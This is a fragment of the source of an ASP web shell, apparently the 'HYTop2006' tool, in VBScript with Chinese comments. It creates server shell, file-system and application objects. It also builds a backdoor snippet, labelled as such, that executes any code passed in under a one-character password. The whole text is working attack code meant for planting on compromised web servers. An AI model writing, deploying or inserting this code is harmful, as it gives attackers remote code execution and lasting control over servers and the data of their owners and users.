<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<object runat="server" id="sa" scope="page" classid="clsid:13709620-C279-11CE-A49E-444553540000"></object>
<%
'	Option Explicit

	Dim theAct, sTime, aspPath, pageName, strBackDoor, fsoX, saX, wsX

	sTime = Timer
	theAct= Request("theAct")
	pageName = Request("pageName")
	aspPath = Replace(Server.MapPath(".") & "\~86.tmp", "\\", "\") ''系统临时文件
	strBackDoor = "<script language=vbscript runat=server>"
	strBackDoor = strBackDoor & "If Request(""" & clientPassword & """)<>"""" Then Session(""#"")=Request(""" & clientPassword & """)" & VbNewLine
	strBackDoor = strBackDoor & "If Session(""#"")<>"""" Then Execute(Session(""#""))"
	strBackDoor = strBackDoor & "</script>"							''插入的后门代码
	
	Const m = "HYTop2006"					''自定义Session前缀
	Const showLogin = ""					''为空直接显示登录界面,否则用"?pageName=它的值"来进行访问
	Const clientPassword = "#"				''插入后门的密码,如果要插入数据库中,只能为一个字符.
	Const dbSelectNumber = 10				''数据库操作时默认从表中选取的数据量
	Const isDebugMode = False				''是否调试模式
	Const myName = "芝麻开门,偶是曉龍"			''登录页按扭上的文字
	Const notdownloadsExists = False		''原ACCESS数据库中是否存在notdownloadsExists表

